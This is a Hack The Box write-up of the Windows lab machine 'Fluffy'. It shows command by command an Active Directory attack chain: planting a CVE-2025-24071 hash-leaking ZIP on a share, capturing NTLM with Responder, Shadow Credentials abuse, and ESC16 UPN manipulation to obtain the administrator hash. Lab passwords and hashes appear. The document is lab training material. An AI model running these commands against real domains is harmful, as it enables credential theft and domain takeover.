@@ -1,0 +1,600 @@
+---
+layout: post
+title: "HTB Writeup – Fluffy"
+date: 2025-06-24
+image: /assets/machine/fluffy/main.jpg
+categories: ["HTB-Machine"]
+tags: [htb, windows]
+excerpt: "Exploit CVE-2025-2407 and ESC16 vulnerability"
+---
+
+<center>
+  <img src="/assets/machine/fluffy/main.jpg" className="img-post" />
+</center>
+
+# RECON
+
+At the start we are given credentials
+Creds: `j.fleischman / J0elTHEM4n1990!`
+
+## Port Scan
+
+```sh
+$ rustscan -a $ip --ulimit 2000 -r 1-65535 -- -A -sC -Pn
+
+PORT STATE SERVICE REASON VERSION
+53/tcp open domain syn-ack Simple DNS Plus
+88/tcp open kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2025-05-25 08:43:11Z)
+139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn
+389/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+|\_ssl-date: 2025-05-25T08:44:49+00:00; +7h00m00s from scanner time.
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
+| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-04-17T16:04:17
+| Not valid after: 2026-04-17T16:04:17
+| MD5: 2765:a68f:4883:dc6d:0969:5d0d:3666:c880
+| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
+| -----BEGIN CERTIFICATE-----
+| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
+| ...
+|\_-----END CERTIFICATE-----
+445/tcp open microsoft-ds? syn-ack
+464/tcp open kpasswd5? syn-ack
+593/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp open ssl/ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
+| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-04-17T16:04:17
+| Not valid after: 2026-04-17T16:04:17
+| MD5: 2765:a68f:4883:dc6d:0969:5d0d:3666:c880
+| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
+| -----BEGIN CERTIFICATE-----
+| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
+| ...
+|\_-----END CERTIFICATE-----
+|\_ssl-date: 2025-05-25T08:44:50+00:00; +7h00m00s from scanner time.
+3268/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+|\_ssl-date: 2025-05-25T08:44:49+00:00; +7h00m00s from scanner time.
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
+| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-04-17T16:04:17
+| Not valid after: 2026-04-17T16:04:17
+| MD5: 2765:a68f:4883:dc6d:0969:5d0d:3666:c880
+| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
+| -----BEGIN CERTIFICATE-----
+| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
+| ...
+|\_-----END CERTIFICATE-----
+3269/tcp open ssl/ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
+| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-04-17T16:04:17
+| Not valid after: 2026-04-17T16:04:17
+| MD5: 2765:a68f:4883:dc6d:0969:5d0d:3666:c880
+| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
+| -----BEGIN CERTIFICATE-----
+| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
+| ...
+|\_-----END CERTIFICATE-----
+|\_ssl-date: 2025-05-25T08:44:50+00:00; +7h00m00s from scanner time.
+5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|\_http-server-header: Microsoft-HTTPAPI/2.0
+|\_http-title: Not Found
+9389/tcp open mc-nmf syn-ack .NET Message Framing
+49667/tcp open msrpc syn-ack Microsoft Windows RPC
+49677/tcp open msrpc syn-ack Microsoft Windows RPC
+49678/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.0
+49680/tcp open msrpc syn-ack Microsoft Windows RPC
+49698/tcp open msrpc syn-ack Microsoft Windows RPC
+49713/tcp open msrpc syn-ack Microsoft Windows RPC
+49747/tcp open msrpc syn-ack Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| p2p-conficker:
+| Checking for Conficker.C or higher...
+| Check 1 (port 37486/tcp): CLEAN (Timeout)
+| Check 2 (port 57052/tcp): CLEAN (Timeout)
+| Check 3 (port 26972/udp): CLEAN (Timeout)
+| Check 4 (port 37715/udp): CLEAN (Timeout)
+|\_ 0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-time:
+| date: 2025-05-25T08:44:12
+|\_ start_date: N/A
+| smb2-security-mode:
+| 3:1:1:
+|\_ Message signing enabled and required
+|\_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
+```
+
+Add the domain and DC hostname to **/etc/hosts**
+
+# USER
+
+## SMB Enum
+
+We enumerate SMB Shares using the **--shares** flag followed by the credentials given at the beginning.
+
+```sh
+$ nxc smb dc01.fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
+
+SMB         10.129.128.33   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
+SMB         10.129.128.33   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
+SMB         10.129.128.33   445    DC01             [*] Enumerated shares
+SMB         10.129.128.33   445    DC01             Share           Permissions     Remark
+SMB         10.129.128.33   445    DC01             -----           -----------     ------
+SMB         10.129.128.33   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.128.33   445    DC01             C$                              Default share
+SMB         10.129.128.33   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.128.33   445    DC01             IT              READ,WRITE
+SMB         10.129.128.33   445    DC01             NETLOGON        READ            Logon server share
+SMB         10.129.128.33   445    DC01             SYSVOL          READ            Logon server share
+```
+
+We can see there is a custom share named **IT** that is **READ/WRITE**.
+
+```sh
+$ smbclient //dc01.fluffy.htb/IT -U 'fluffy.htb\j.fleischman%J0elTHEM4n1990!'
+
+smb: \> ls
+  .                                   D        0  Sun May 25 02:00:47 2025
+  ..                                  D        0  Sun May 25 02:00:47 2025
+  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 08:08:44 2025
+  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 08:04:05 2025
+  KeePass-2.58                        D        0  Fri Apr 18 08:08:38 2025
+  KeePass-2.58.zip                    A  3225346  Fri Apr 18 08:03:17 2025
+  Upgrade_Notice.pdf                  A   169963  Sat May 17 07:31:07 2025
+
+                5842943 blocks of size 4096. 1966861 blocks available
+```
+
+Download the files.
+
+```sh
+smb: \> mget KeePass-2.58.zip
+smb: \> mget Everything-1.4.1.1026.x64.zip
+smb: \> mget Upgrade_Notice.pdf
+```
+
+Then unzip the KeePass file.
+
+```sh
+$ unzip KeePass-2.58.zip -d keepass
+
+$ tree keepass
+keepass
+├── KeePass.chm
+├── KeePass.exe
+├── KeePass.exe.config
+├── KeePassLibC32.dll
+├── KeePassLibC64.dll
+├── KeePass.XmlSerializers.dll
+├── Languages
+├── License.txt
+├── Plugins
+├── ShInstUtil.exe
+└── XSL
+    ├── KDBX_Common.xsl
+    ├── KDBX_DetailsFull_HTML.xsl
+    ├── KDBX_DetailsLight_HTML.xsl
+    ├── KDBX_PasswordsOnly_TXT.xsl
+    └── KDBX_Tabular_HTML.xsl
+
+4 directories, 13 files
+```
+
+Look at the config inside `KeePass.exe.config`:
+
+```xml
+<?xml version="1.0" encoding="utf-8" ?>
+<configuration>
+        <startup useLegacyV2RuntimeActivationPolicy="true">
+                <supportedRuntime version="v4.0" />
+                <supportedRuntime version="v2.0.50727" />
+        </startup>
+        <runtime>
+                <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
+                        <dependentAssembly>
+                                <assemblyIdentity name="KeePass"
+                                        publicKeyToken="fed2ed7716aecf5c"
+                                        culture="neutral" />
+                                <bindingRedirect oldVersion="2.0.9.0-2.57.127.127"
+                                        newVersion="2.58.0.0" />
+                        </dependentAssembly>
+                </assemblyBinding>
+                <enforceFIPSPolicy enabled="false" />
+                <loadFromRemoteSources enabled="true" />
+        </runtime>
+        <appSettings>
+                <add key="EnableWindowsFormsHighDpiAutoResizing" value="true" />
+        </appSettings>
+</configuration>
+```
+
+This **KeePass.exe.config** is a standard .NET app configuration file, and it does not display credentials.
+
+But we can see this line:
+
+```xml
+<loadFromRemoteSources enabled="true" />
+```
+
+This means it instructs the .NET runtime to allow loading assemblies (DLLs) from remote locations, including:
+
+* UNC paths (\\attacker\\share\\malicious.dll)
+* Mapped Drives
+* Even web-based locations (on older versions or misconfigurations)
+
+Normally, this would be blocked by .NET security policy — unless explicitly allowed like here.
+
+So at this point we can do:
+
+1. Phishing on the intranet via SMB path (\\).
+2. Spoofing lures.
+3. Sending phishing payloads via intranet share references.
+
+## CVE-2025-24071
+
+### Phishing
+
+[CVE-2025-24071 PoC repo](https://github.com/ThemeHackers/CVE-2025-24071)
+
+*The issue arises from the implicit trust and automatic file parsing behavior of .library-ms files in Windows Explorer. An unauthenticated attacker can exploit this vulnerability by constructing RAR/ZIP files containing a malicious SMB path. Upon decompression, this triggers an SMB authentication request, potentially exposing the user's NTLM hash* (From the reference link above.)
+
+So first we create the malicious Zip.
+
+```sh
+python exploit.py -f Microsoft -i 10.10.14.212
+```
+
+Change the Zip name to match KeePass.
+
+```sh
+mv exploit.zip KeePass-2.58.zip
+```
+Deploy and mount to the `IT` share.
+
+```sh
+sudo mount -t cifs \
+	  //dc01.fluffy.htb/IT /mnt/ \
+	  -o username='j.fleischman',password='J0elTHEM4n1990!',domain='fluffy.htb'
+```
+
+Replace the existing archive with the one we made.
+
+```sh
+sudo cp KeePass-2.58.zip /mnt/KeePass-2.58.zip
+```
+
+Then we trigger using **Responder**
+
+```bash
+sudo responder -I tun0 -wvF
+
+[... omitted 105 of 361 lines ...]
+
+See the image below:
+
+<center>
+  <img src="/assets/machine/fluffy/bloodhound.jpg" className="img-post" />
+</center>
+
+We can add ourselves to the **SERVICE** user group
+
+## DACL Abuse
+
+### GenericAll
+
+We add `winrm_svc` to the group *SERVICE ACCOUNTS*
+
+```sh
+bloodyAD --host $ip -d 'fluffy.htb' \
+	  -u 'p.agila' -p 'prometheusx-303' \
+	  add groupMember 'SERVICE ACCOUNTS' 'p.agila'
+```
+
+We take over using `bloodyAD set owner`:
+
+```sh
+bloodyAD --host $ip -d 'fluffy.htb' \
+	  -u 'p.agila' -p 'prometheusx-303' \
+	  set owner 'SERVICE ACCOUNTS' 'p.agila'
+```
+
+### GenericWrite
+
+But because we only have GenericWrite rights, if we change the password it will be blocked, since our access is not full control.
+
+#### Shadow Credentials Attack
+
+With **GenericWrite**, we can use the **Shadow Credentials Attack** technique.
+
+There are many tools we can use, such as bloodyAD, certipy, pywhisker, etc. Here we use certipy.
+
+Before that we synchronize the time between our machine and the server using `ntpdate -s $ip`
+
+```sh
+certipy shadow auto \
+	-username 'p.agila@fluffy.htb' -password 'prometheusx-303' \
+	-account winrm_svc
+```
+
+```
+certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'                           
+
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'winrm_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '5f3391a6-1fa0-c13f-9f4b-73cd3536412f'
+[*] Adding Key Credential with device ID '5f3391a6-1fa0-c13f-9f4b-73cd3536412f' to the Key Credentials for 'winrm_svc'
+[*] Successfully added Key Credential with device ID '5f3391a6-1fa0-c13f-9f4b-73cd3536412f' to the Key Credentials for 'winrm_svc'
+[*] Authenticating as 'winrm_svc' with the certificate
+[*] Using principal: winrm_svc@fluffy.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'winrm_svc.ccache'
+[*] Trying to retrieve NT hash for 'winrm_svc'
+[*] Restoring the old Key Credentials for 'winrm_svc'
+[*] Successfully restored the old Key Credentials for 'winrm_svc'
+[*] NT hash for 'winrm_svc': <hidden>
+```
+
+### WinRM
+
+After obtaining the hash, we just use evil-winrm to log in and get the user flag.
+
+```sh
+evil-winrm -i pluffy.htb -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af48xxxxx'
+```
+
+# ROOT
+
+Just like the method above, we can get the `ca_svc` hash. 
+
+To make it easier, we write a small script.
+
+```sh
+#!/bin/bash
+
+set -x
+
+TARGET="10.10.11.69"
+
+# Add group
+bloodyAD --host $TARGET -d 'fluffy.htb' \
+	  -u 'p.agila' -p 'prometheusx-303' \
+	  add groupMember 'SERVICE ACCOUNTS' 'p.agila' || true
+
+# Set owner
+bloodyAD --host $TARGET -d 'fluffy.htb' \
+	  -u 'p.agila' -p 'prometheusx-303' \
+	  set owner 'SERVICE ACCOUNTS' 'p.agila'
+who
+
+ntpdate -s $TARGET
+
+# Hack: Shadow credentials
+certipy shadow auto \
+	  -username ''p.agila@fluffy.htb'' -password 'prometheusx-303' \
+	  -account ca_svc
+```
+
+## Certipy
+
+I was stuck for a while, and I tried checking several vulnerabilities on the Certificate because we can manipulate `ca_svc` but could not find anything, so I tried updating certipy using the one directly from GitHub.
+
+```sh
+certipy find -target 'dc01.fluffy.htb' -dc-ip $ip \
+      -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8'
+```
+
+From the results below there are several elements we can exploit, but there is one most interesting:
+
+```json
+{
+  "Vulnerabilities": {
+    "ESC16": "Security Extension is disabled"
+  },
+  "Certificate Authorities": {
+    "fluffy-DC01-CA": {
+      "DNS Name": "DC01.fluffy.htb",
+      "Request Disposition": "Issue",
+      "Web Enrollment": {
+        "http": false,
+        "https": false
+      },
+      "Permissions": {
+        "Owner": "FLUFFY.HTB\\Administrators",
+        "Access Rights": {
+          "Issue and Manage Certificates": [
+            "FLUFFY.HTB\\Domain Admins",
+            "FLUFFY.HTB\\Enterprise Admins",
+            "FLUFFY.HTB\\Administrators"
+          ],
+          "Manage CA": [
+            "FLUFFY.HTB\\Domain Admins",
+            "FLUFFY.HTB\\Enterprise Admins",
+            "FLUFFY.HTB\\Administrators"
+          ],
+          "Publish Certificates": [
+            "FLUFFY.HTB\\Cert Publishers"
+          ]
+        }
+      }
+    }
+  },
+  "Published Templates": [
+    {
+      "Template Name": "User",
+      "Display Name": "User",
+      "Enabled": true,
+      "Schema Version": 1,
+      "Extended Key Usage": [
+        "Encrypting File System",
+        "Secure Email",
+        "Client Authentication"
+      ],
+      "User Enrollable Principals": [
+        "FLUFFY.HTB\\Domain Users"
+      ],
+      "Remarks": {
+        "ESC2": "Template can be targeted as part of ESC2 exploitation.",
+        "ESC3": "Template can be targeted as part of ESC3 exploitation."
+      }
+    },
+    {
+      "Template Name": "EFS",
+      "Display Name": "Basic EFS",
+      "Enabled": true,
+      "Extended Key Usage": [
+        "Encrypting File System"
+      ],
+      "User Enrollable Principals": [
+        "FLUFFY.HTB\\Domain Users"
+      ]
+    },
+    {
+      "Template Name": "Machine",
+      "Display Name": "Computer",
+      "Enabled": true,
+      "Extended Key Usage": [
+        "Client Authentication",
+        "Server Authentication"
+      ],
+      "User Enrollable Principals": [
+        "FLUFFY.HTB\\Domain Computers"
+      ],
+      "Remarks": {
+        "ESC2": "Template can be targeted as part of ESC2 exploitation.",
+        "ESC3": "Template can be targeted as part of ESC3 exploitation."
+      }
+    }
+  ]
+}
+```
+
+⚠️ We found an **ESC16** Vulnerability.
+
+## ESC16
+
+### Overview
+
+Look at the first/top line.
+
+```
+"ESC16": "Security Extension is disabled"
+```
+
+> ESC16 is also mentioned in the [Certipy Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally).
+
+Now we can perform a "UPN Manipulation Attack".
+
+### UPN Manipulation
+
+We use the `ca_svc` account:
+
+```sh
+certipy account \
+      -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
+      -dc-ip $ip -user 'ca_svc' \
+      read
+```
+
+Output we get:
+
+```
+[*] Reading attributes for 'ca_svc':
+cn                                  : certificate authority service
+distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
+name                                : certificate authority service
+objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
+sAMAccountName                      : ca_svc
+servicePrincipalName                : ADCS/ca.fluffy.htb
+userPrincipalName                   : ca_svc@fluffy.htb
+userAccountControl                  : 66048
+whenCreated                         : 2025-04-17T16:07:50+00:00
+whenChanged                         : 2025-05-25T15:25:56+00:00
+```
+
+Our goal is to overwrite `userPrincipalName` from (`ca_svc@fluffy.htb`) to `administrator@fluffy.htb`.
+
+This allows us to impersonate the administrator account during certificate enrollment.
+
+```sh
+certipy account \
+      -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
+      -dc-ip $ip -upn 'administrator' \
+      -user 'ca_svc' \
+      update
+```
+
+Run again to make sure.
+
+```sh
+certipy req -dc-ip $ip \
+      -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
+      -target 'DC01.fluffy.htb' \
+      -ca 'fluffy-DC01-CA' \
+      -template 'User'
+```
+
+Now we get the administrator UPN that has been created by the CA.
+
+Now revert our fake UPN so it doesn’t conflict with the original.
+
+```
+certipy account \
+    -u ''ca_svc@fluffy.htb'' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
+    -dc-ip $ip -upn 'ca_svc' \
+    -user 'ca_svc' \
+    update
+```
+
+We can extract the hash from the `administrator.pfx` file
+
+```sh
+certipy auth \
+    -dc-ip $ip -pfx 'administrator.pfx' \
+    -username 'Administrator' -domain 'fluffy.htb'
+```
+
+Result:
+
+```
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator'
+[*] Using principal: 'administrator@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676cxxxxx
+```
+
+You can use evil-winrm or other tooling as you like.
+
+<center>
+  <img src="/assets/machine/fluffy/root.jpg" className="img-post" />
+</center>
+
+Rooted.
+
